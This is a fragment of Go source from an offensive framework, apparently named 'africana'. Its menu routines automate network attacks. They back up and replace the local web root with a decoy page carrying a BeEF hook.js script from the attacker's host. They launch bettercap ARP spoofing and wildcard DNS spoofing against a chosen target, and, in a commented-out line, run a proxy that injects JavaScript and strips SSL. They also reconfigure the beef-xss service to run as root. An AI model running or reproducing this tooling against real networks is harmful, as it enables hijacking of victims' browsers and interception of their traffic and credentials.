            fileXPath := "/var/www/html/.userFiles"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/africana-site/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface, userTarget); fmt.Println()
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
    case "2":
        if _, err := exec.LookPath("beef-xss"); err != nil {
            fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.RED, bcolors.ENDC)
            return
        }
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
            }
            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userIface, _ := reader.ReadString('\n')
            userIface = strings.TrimSpace(userIface)
            if userIface == "" {
                userIface = "eth0"
            }
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userLhost, _ := reader.ReadString('\n')
            userLhost = strings.TrimSpace(userLhost)
            if userLhost == "" {
                userLhost = userLhostIp
            }
            //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userLhost); fmt.Println()
            fileXPath := "/var/www/html/.userFiles"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/africana-site/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface); fmt.Println()
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
    fmt.Println()
}

func BeefInjector(userTarget string) {
    for {
        menus.MenuThreeThree()
        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefInject " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Ettercap" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userInput, _ := reader.ReadString('\n')
        userInput = strings.TrimSpace(userInput)
        if userInput == "" {
            userInput = "1"
         }
        switch userInput {
        case "0":
            return
        case "1":
            BeefEttercap  (userTarget)
        case "2":
            BeefBettercap (userTarget)
        default:
            fmt.Println(bcolors.BLUE + "(" + bcolors.RED + "Poor choice of selection. Please try option " + bcolors.GREEN + "00 " + bcolors.YELLOW  + "or " + bcolors.BLUE + "(" + bcolors.DARKCYAN + "0 to 9" + bcolors.BLUE + ")" + bcolors.ENDC)
         }
    }
}
